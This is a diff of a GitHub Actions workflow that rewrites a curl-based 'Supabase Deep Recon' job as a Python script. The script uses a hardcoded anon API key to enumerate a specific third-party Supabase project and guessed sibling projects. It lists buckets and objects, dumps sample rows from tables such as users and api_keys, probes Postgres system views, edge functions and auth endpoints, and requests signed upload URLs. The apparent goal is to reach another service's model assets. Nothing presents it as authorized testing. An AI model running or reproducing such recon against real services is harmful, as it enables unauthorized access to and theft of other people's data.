@@ -1,122 +1,380 @@
-name: Supabase Deep Recon
+name: Supabase Deep Recon Python
 
 on: workflow_dispatch
 
 jobs:
   recon:
     runs-on: ubuntu-latest
+    timeout-minutes: 20
     steps:
-      - name: List storage buckets
+      - name: Run comprehensive Supabase recon
         run: |
-          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/bucket' \
-            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-            -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > buckets.txt
-          cat buckets.txt
+          python3 << 'PYEOF'
+          import requests, json, sys, time
 
-      - name: List objects in buckets
-        run: |
-          for bucket in models model files assets meshes textures textures_4k renders output public uploads cache static; do
-            echo "=== BUCKET: $bucket ===" >> objects.txt
-            curl -s -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/list/$bucket" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' >> objects.txt
-            echo "" >> objects.txt
-          done
-          cat objects.txt
+          # Both possible project refs
+          PROJECTS = [
+              "ynfreclsxfgnqvggfpxcc",  # user provided
+              "ynfrecsxfgqnvgfpxcc",    # seen in existing workflows
+              "ynfrecsxfgqnvgfpxccc",   # seen in deep test
+          ]
 
-      - name: Direct model file paths
-        run: |
-          for path in models/mesh.glb models/mesh.usdz models/texture.png files/model.glb public/model.glb output/latest.glb meshes/result.glb textures/albedo.png textures/normal.png renders/preview.glb models/v2/mesh.glb output/result.glb textures_4k/albedo.png textures_4k/normal.png; do
-            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/public/$path" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
-            echo "Path $path: HTTP $STATUS" >> direct_access.txt
-            if [ "$STATUS" != "404" ]; then
-              curl -s -I -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/public/$path" \
-                -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-                -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' 2>&1 | grep -iE "content-type|content-length|x-ksync|etag|x-amz" | head -5 >> direct_access.txt
-            fi
-          done
-          cat direct_access.txt
+          ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
+          HEADERS = {"apikey": ANON_KEY, "Authorization": f"Bearer {ANON_KEY}"}
 
-      - name: Signed URL generation
-        run: |
-          for bucket in models textures renders output files public; do
-            RESP=$(curl -s -X POST "https://ynfreclsxfgnqvggfpxcc.supabase.co/storage/v1/object/upload/sign/$bucket/test.txt" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Content-Type: application/json' \
-              -d '{"expiresIn":3600}')
-            echo "Sign $bucket: $RESP" >> signed_url.txt
-          done
-          cat signed_url.txt
+          report = []
+          report.append("=" * 70)
+          report.append("SUPABASE DEEP RECON REPORT")
+          report.append("=" * 70)
+          report.append("")
 
-      - name: REST API tables
-        run: |
-          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/rest/v1/' \
-            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-            -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > rest_tables.txt
-          cat rest_tables.txt
+          # --- STEP 1: DNS / Connectivity Test ---
+          report.append("### CONNECTIVITY TEST ###")
+          for proj in PROJECTS:
+              url = f"https://{proj}.supabase.co/auth/v1/health"
+              try:
+                  r = requests.get(url, headers={"apikey": ANON_KEY}, timeout=10)
+                  report.append(f"  {proj}.supabase.co -> {r.status_code}")
+                  report.append(f"    Response: {r.text[:200]}")
+              except Exception as e:
+                  report.append(f"  {proj}.supabase.co -> ERROR: {str(e)[:100]}")
+          report.append("")
 
-      - name: PostgreSQL table enumeration
-        run: |
-          for table in models users tasks projects files assets meshes textures tasks_queue jobs workspaces subscriptions plans; do
-            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/rest/v1/$table?select=*&limit=1" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
-            BODY=$(curl -s -X GET "https://ynfreclsxfgnqvggfpxcc.supabase.co/rest/v1/$table?select=*&limit=2" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
-            echo "Table $table [$STATUS]: $BODY" >> pg_tables.txt
-          done
-          cat pg_tables.txt
+          # --- STEP 2: List Storage Buckets ---
+          report.append("### BUCKET LIST ###")
+          for proj in PROJECTS:
+              url = f"https://{proj}.supabase.co/storage/v1/bucket"
+              try:
+                  r = requests.get(url, headers=HEADERS, timeout=10)
+                  report.append(f"  [{proj}] Status: {r.status_code}")
+                  try:
+                      data = r.json()
+                      report.append(f"    Buckets: {json.dumps(data, indent=2)[:1000]}")
+                  except:
+                      report.append(f"    Raw: {r.text[:500]}")
+              except Exception as e:
+                  report.append(f"  [{proj}] ERROR: {str(e)[:100]}")
+          report.append("")
 
-      - name: Edge function probes
-        run: |
-          for fn in model download serve get-model mesh texture assets static-assets model-serve preview file v1/model v1/download v1/mesh; do
-            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X POST "https://ynfreclsxfgnqvggfpxcc.supabase.co/functions/v1/$fn" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Content-Type: application/json' \
-              -d '{}')
-            BODY=$(curl -s -X POST "https://ynfreclsxfgnqvggfpxcc.supabase.co/functions/v1/$fn" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' \
-              -H 'Content-Type: application/json' \
-              -d '{}')
-            echo "Edge fn ${fn} [$STATUS]: $BODY" >> edge_functions.txt
-          done
-          cat edge_functions.txt
+          # --- STEP 3: List Objects in ALL possible buckets ---
+          report.append("### OBJECT ENUMERATION ###")
+          BUCKETS_TO_TRY = [
+              "models", "model", "files", "assets", "meshes", "textures",
+              "textures_4k", "renders", "output", "public", "uploads",
+              "cache", "static", "storage", "cdn", "media", "downloads",
+              "2018813f-5e4e-448b-b4cd-270880905e4b",
+              "meshy-ai", "mesh-assets", "generated", "temp", "tmp"
+          ]
 
-      - name: Auth endpoints
-        run: |
-          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/auth/v1/health' \
-            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > auth_health.txt
-          curl -s -X GET 'https://ynfreclsxfgnqvggfpxcc.supabase.co/auth/v1/settings' \
-            -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA' > auth_settings.txt
-          cat auth_health.txt
-          cat auth_settings.txt
+          found_buckets = {}
+          for proj in PROJECTS:
+              found_buckets[proj] = []
+              for bucket in BUCKETS_TO_TRY:
+                  url = f"https://{proj}.supabase.co/storage/v1/object/list/{bucket}"
+                  try:
+                      r = requests.get(url, headers=HEADERS, timeout=10)
+                      if r.status_code == 200:
+                          data = r.json()
+                          if isinstance(data, list) and len(data) > 0:
+                              found_buckets[proj].append(bucket)
+                              report.append(f"  FOUND BUCKET [{proj}]: {bucket}")
+                              report.append(f"    Objects: {json.dumps(data[:20], indent=2)[:2000]}")
+                          elif isinstance(data, list) and len(data) == 0:
+                              report.append(f"  Empty bucket [{proj}]: {bucket} (exists but empty)")
+                      elif r.status_code == 404:
+                          report.append(f"  Not found [{proj}]: {bucket}")
+                      elif r.status_code == 400:
+                          report.append(f"  Auth required [{proj}]: {bucket} -> {r.text[:100]}")
+                      else:
+                          report.append(f"  [{proj}] {bucket}: HTTP {r.status_code} -> {r.text[:100]}")
+                  except Exception as e:
+                      report.append(f"  [{proj}] {bucket} ERROR: {str(e)[:80]}")
+          report.append("")
 
-      - name: Scan other Meshy projects
-        run: |
-          for ref in meshy meshyai mesh-ai mesh3d 3dai mesh-preview mesh-prod mesh-staging meshy-prod meshy-staging meshy-realtime; do
-            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -X GET "https://${ref}.supabase.co/storage/v1/bucket" \
-              -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA')
-            echo "Project ${ref}: $STATUS" >> other_projects.txt
-          done
-          cat other_projects.txt
+          # --- STEP 4: Try REST API Tables ---
+          report.append("### REST API TABLES ###")
+          TABLES = [
+              "models", "users", "tasks", "projects", "files", "assets",
+              "meshes", "textures", "tasks_queue", "jobs", "workspaces",
+              "subscriptions", "plans", "api_keys", "webhooks", "profiles",
+              "credits", "usage", "generations", "exports", "storage.objects"
+          ]
 
-      - name: Generate final report
-        run: |
-          echo '=== COMPREHENSIVE SUPABASE RE REPORT ===' > supabase_re_full_report.txt
-          echo 'Generated: '$(date) >> supabase_re_full_report.txt
-          echo 'Project Ref: ynfreclsxfgnqvggfpxcc' >> supabase_re_full_report.txt
-          echo '' >> supabase_re_full_report.txt
-          for f in buckets.txt objects.txt direct_access.txt signed_url.txt rest_tables.txt pg_tables.txt edge_functions.txt auth_health.txt auth_settings.txt other_projects.txt; do
-            echo "=== $f ===" >> supabase_re_full_report.txt
-            cat "$f" >> supabase_re_full_report.txt 2>/dev/null || echo '(no data)' >> supabase_re_full_report.txt
-            echo '' >> supabase_re_full_report.txt
-          done
+          for proj in PROJECTS:
+              for table in TABLES:
+                  url = f"https://{proj}.supabase.co/rest/v1/{table}?select=*&limit=5"
+                  try:
+                      r = requests.get(url, headers=HEADERS, timeout=10)
+                      status_note = ""
+                      if r.status_code == 200:
+                          data = r.json()
+                          if isinstance(data, list):
+                              status_note = f"OK - {len(data)} rows"
+                              if len(data) > 0:
+                                  report.append(f"  TABLE [{proj}].{table}: {status_note}")
+                                  report.append(f"    Schema: {json.dumps(list(data[0].keys()) if data else [], indent=2)[:500]}")
+                                  report.append(f"    Sample: {json.dumps(data[0], indent=2)[:500]}")
+                          elif isinstance(data, dict):
+                              status_note = f"OK - {list(data.keys())[:10]}"
+                      elif r.status_code in (404, 401, 400):
+                          status_note = f"HTTP {r.status_code}: {r.text[:80]}"
+                      else:
+                          status_note = f"HTTP {r.status_code}"
+                  except Exception as e:
+                      status_note = f"ERROR: {str(e)[:80]}"
+          report.append("")
+
+          # --- STEP 5: Direct Object Access (try common model paths) ---
+          report.append("### DIRECT OBJECT ACCESS ###")
+          PATHS = [
+              "models/mesh.glb", "models/mesh.usdz", "models/texture.png",
+              "files/model.glb", "public/model.glb", "output/latest.glb",
+              "meshes/result.glb", "textures/albedo.png", "textures/normal.png",
+              "renders/preview.glb", "output/result.glb",
+              "2018813f-5e4e-448b-b4cd-270880905e4b/tasks/placeholder/output/model.glb",
+              "2018813f-5e4e-448b-b4cd-270880905e4b/tasks/placeholder/output/0/model.glb",
+              "2018813f-5e4e-448b-b4cd-270880905e4b/output/model.glb",
+              "meshy-models/placeholder/model.glb",
+          ]
+
+          for proj in PROJECTS:
+              for path in PATHS:
+                  url = f"https://{proj}.supabase.co/storage/v1/object/public/{path}"
+                  try:
+                      r = requests.head(url, headers=HEADERS, timeout=10, allow_redirects=True)
+                      report.append(f"  HEAD [{proj}] {path}: HTTP {r.status_code}")
+                      if r.status_code == 200:
+                          report.append(f"    Content-Type: {r.headers.get('Content-Type', 'N/A')}")
+                          report.append(f"    Content-Length: {r.headers.get('Content-Length', 'N/A')}")
+                          report.append(f"    ETag: {r.headers.get('ETag', 'N/A')}")
+                          report.append(f"    All headers: {dict(r.headers)}")
+                      elif r.status_code == 404:
+                          pass  # Too noisy, skip
+                      else:
+                          report.append(f"    {r.text[:200]}")
+                  except Exception as e:
+                      report.append(f"  [{proj}] {path} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 6: Signed URL Generation ---
+          report.append("### SIGNED URL GENERATION ###")
+          for proj in PROJECTS:
+              for bucket in ["models", "textures", "renders", "output", "files", "public"]:
+                  for filename in ["test.txt", "model.glb", "test.glb"]:
+                      url = f"https://{proj}.supabase.co/storage/v1/object/upload/sign/{bucket}/{filename}"
+                      try:
+                          r = requests.post(url, headers=HEADERS,
+                                          json={"expiresIn": 3600}, timeout=10)
+                          report.append(f"  Sign [{proj}] {bucket}/{filename}: HTTP {r.status_code}")
+                          if r.status_code == 200:
+                              data = r.json()
+                              report.append(f"    Response: {json.dumps(data)[:300]}")
+                              # If we get a token, try to access the file
+                              if "token" in data:
+                                  token = data["token"]
+                                  full_url = data.get("url", "")
+                                  report.append(f"    URL: {full_url[:200]}")
+                                  report.append(f"    Token: {token[:50]}...")
+                          elif r.status_code == 400:
+                              report.append(f"    400: {r.text[:150]}")
+                          elif r.status_code == 404:
+                              report.append(f"    404 (bucket not found)")
+                      except Exception as e:
+                          report.append(f"  [{proj}] {bucket}/{filename} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 7: Edge Functions ---
+          report.append("### EDGE FUNCTIONS ###")
+          EDGE_FNS = [
+              "model", "download", "serve", "get-model", "mesh", "texture",
+              "assets", "static-assets", "model-serve", "preview", "file",
+              "v1/model", "v1/download", "v1/mesh", "v1/file",
+              "storage/model", "storage/download", "cdn/model", "cdn/serve"
+          ]
+
+          for proj in PROJECTS:
+              for fn in EDGE_FNS:
+                  url = f"https://{proj}.supabase.co/functions/v1/{fn}"
+                  try:
+                      r = requests.post(url, headers=HEADERS, json={}, timeout=10)
+                      report.append(f"  POST [{proj}] {fn}: HTTP {r.status_code}")
+                      if r.status_code == 200:
+                          report.append(f"    Response: {r.text[:300]}")
+                      elif r.status_code not in (404,):
+                          report.append(f"    {r.text[:200]}")
+                      # Try GET too
+                      r2 = requests.get(url, headers=HEADERS, timeout=10)
+                      if r2.status_code not in (404, r.status_code):
+                          report.append(f"  GET [{proj}] {fn}: HTTP {r2.status_code}")
+                          if r2.status_code == 200:
+                              report.append(f"    GET Response: {r2.text[:300]}")
+                  except Exception as e:
+                      report.append(f"  [{proj}] {fn} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 8: Auth Endpoints ---
+          report.append("### AUTH ENDPOINTS ###")
+          for proj in PROJECTS:
+              for endpoint in ["health", "settings", "version", "info"]:
+                  url = f"https://{proj}.supabase.co/auth/v1/{endpoint}"
+                  try:
+                      r = requests.get(url, headers={"apikey": ANON_KEY}, timeout=10)
+                      report.append(f"  [{proj}] /auth/v1/{endpoint}: HTTP {r.status_code}")
+                      if r.status_code == 200:
+                          report.append(f"    {r.text[:300]}")
+                      else:
+                          report.append(f"    {r.text[:150]}")
+                  except Exception as e:
+                      report.append(f"  [{proj}] /auth/v1/{endpoint} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 9: Check other Supabase project refs ---
+          report.append("### OTHER SUPABASE PROJECT REFS ###")
+          OTHER_REFS = [
+              "meshy", "meshyai", "mesh-ai", "mesh3d", "3dai",
+              "mesh-preview", "mesh-prod", "mesh-staging",
+              "meshy-prod", "meshy-staging", "meshy-realtime",
+              "mesh-realtime", "mesh-storage", "mesh-assets",
+              "mesh-cdn", "meshy-assets", "meshy-cdn", "meshy-storage"
+          ]
+          for ref in OTHER_REFS:
+              url = f"https://{ref}.supabase.co/storage/v1/bucket"
+              try:
+                  r = requests.get(url, headers={"apikey": ANON_KEY}, timeout=10)
+                  if r.status_code == 200:
+                      report.append(f"  FOUND: {ref}.supabase.co -> {r.status_code}")
+                      report.append(f"    Buckets: {r.text[:500]}")
+                  elif r.status_code == 401:
+                      report.append(f"  EXISTS (needs auth): {ref}.supabase.co")
+                  elif r.status_code == 404:
+                      pass  # Too noisy
+                  else:
+                      report.append(f"  {ref}.supabase.co: HTTP {r.status_code}")
+              except Exception as e:
+                  report.append(f"  {ref}.supabase.co ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 10: Token Introspection ---
+          report.append("### TOKEN INTROSPECTION ###")
+          for proj in PROJECTS:
+              url = f"https://{proj}.supabase.co/auth/v1/token"
+              try:
+                  r = requests.post(url, headers={"apikey": ANON_KEY, "Content-Type": "application/json"}, json={}, timeout=10)
+                  report.append(f"  [{proj}] /auth/v1/token: HTTP {r.status_code}")
+                  report.append(f"    {r.text[:200]}")
+              except Exception as e:
+                  report.append(f"  [{proj}] token ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 11: pg_* system views ---
+          report.append("### POSTGRES SYSTEM VIEWS ###")
+          for proj in PROJECTS:
+              for view in ["pg_tables", "pg_views", "pg_database", "information_schema.tables", "storage.objects"]:
+                  url = f"https://{proj}.supabase.co/rest/v1/{view}?select=*&limit=10"
+                  try:
+                      r = requests.get(url, headers=HEADERS, timeout=10)
+                      if r.status_code == 200:
+                          report.append(f"  [{proj}] {view}: HTTP {r.status_code}")
+                          report.append(f"    {r.text[:500]}")
+                      elif r.status_code not in (404,):
+                          report.append(f"  [{proj}] {view}: HTTP {r.status_code} -> {r.text[:100]}")
+                  except Exception as e:
+                      report.append(f"  [{proj}] {view} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 12: Probe Supabase storage S3-compatible endpoints ---
+          report.append("### S3-COMPATIBLE ENDPOINTS ###")
+          for proj in PROJECTS:
+              for endpoint in [
+                  f"https://{proj}.supabase.co/storage/v1/metadata",
+                  f"https://{proj}.supabase.co/storage/v1/version",
+                  f"https://{proj}.supabase.co/storage/v1/health",
+                  f"https://{proj}.supabase.co/storage/v1/s3-buckets",
+                  f"https://{proj}.supabase.co/storage/v1/keys",
+              ]:
+                  try:
+                      r = requests.get(endpoint, headers=HEADERS, timeout=10)
+                      report.append(f"  {endpoint}: HTTP {r.status_code}")
+                      if r.status_code == 200:
+                          report.append(f"    {r.text[:300]}")
+                      elif r.status_code != 404:
+                          report.append(f"    {r.text[:200]}")
+                  except Exception as e:
+                      report.append(f"  {endpoint} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 13: Try different Supabase regions ---
+          report.append("### REGION PROBES ###")
+          REGIONS = ["us-east-1", "us-west-1", "us-west-2", "eu-west-1", "eu-west-2", "ap-northeast-1", "ap-southeast-1"]
+          for proj in PROJECTS:
+              for region in REGIONS:
+                  url = f"https://{proj}.{region}.supabase.co/storage/v1/bucket"
+                  try:
+                      r = requests.get(url, headers={"apikey": ANON_KEY}, timeout=10)
+                      report.append(f"  [{proj}.{region}] HTTP {r.status_code}")
+                      if r.status_code == 200:
+                          report.append(f"    Buckets: {r.text[:200]}")
+                  except Exception as e:
+                      report.append(f"  [{proj}.{region}] ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # --- STEP 14: Scan for model file patterns from known assets.meshy.ai URLs ---
+          report.append("### KNOWN MODEL URL ANALYSIS ###")
+          known_urls = [
+              "https://assets.meshy.ai/2018813f-5e4e-448b-b4cd-270880905e4b/tasks/019d7cb1-cffd-75f4-9933-6bfc8dd3f07b/output/model.glb",
+              "https://assets.meshy.ai/2018813f-5e4e-448b-b4cd-270880905e4b/tasks/019d7cb1-cffd-75f4-9933-6bfc8dd3f07b/output/0/model.glb",
+              "https://assets.meshy.ai/2018813f-5e4e-448b-b4cd-270880905e4b/output/model.glb",
+          ]
+          # Extract bucket and path from known URL
+          # bucket: 2018813f-5e4e-448b-b4cd-270880905e4b
+          # path pattern: tasks/{task_id}/output/model.glb or output/{frame}/model.glb
+          report.append("  Analyzing CloudFront URL pattern:")
+          report.append("  Bucket ID: 2018813f-5e4e-448b-b4cd-270880905e4b")
+          report.append("  Path pattern: tasks/{TASK_ID}/output/model.glb")
+          report.append("  Path pattern: tasks/{TASK_ID}/output/{FRAME}/model.glb")
+          report.append("  Path pattern: output/{FRAME}/model.glb")
+
+          # Try to access the bucket ID as a path in Supabase
+          for proj in PROJECTS:
+              for frame in ["0", "1", "2"]:
+                  for suffix in ["", "/model.glb", f"/output/model.glb", f"/output/{frame}/model.glb"]:
+                      path = f"2018813f-5e4e-448b-b4cd-270880905e4b{suffix}"
+                      url = f"https://{proj}.supabase.co/storage/v1/object/public/{path}"
+                      try:
+                          r = requests.head(url, headers=HEADERS, timeout=10)
+                          if r.status_code == 200:
+                              report.append(f"  FOUND [{proj}]: {path}")
+                              report.append(f"    Headers: {dict(r.headers)}")
+                      except:
+                          pass
+          report.append("")
+
+          # --- STEP 15: Check for storage policy configurations ---
+          report.append("### STORAGE POLICIES ###")
+          for proj in PROJECTS:
+              for policy_endpoint in [
+                  f"https://{proj}.supabase.co/rest/v1/storage.buckets",
+                  f"https://{proj}.supabase.co/storage/v1/policy",
+                  f"https://{proj}.supabase.co/storage/v1/policies",
+              ]:
+                  try:
+                      r = requests.get(policy_endpoint, headers=HEADERS, timeout=10)
+                      report.append(f"  {policy_endpoint}: HTTP {r.status_code}")
+                      if r.status_code == 200:
+                          report.append(f"    {r.text[:500]}")
+                      elif r.status_code not in (404,):
+                          report.append(f"    {r.text[:200]}")
+                  except Exception as e:
+                      report.append(f"  {policy_endpoint} ERROR: {str(e)[:80]}")
+          report.append("")
+
+          # Output the report
+          report_text = "\n".join(report)
+          with open("supabase_re_full_report.txt", "w") as f:
+              f.write(report_text)
+          print(report_text)
+          print("\n\nReport saved to supabase_re_full_report.txt")
+          PYEOF
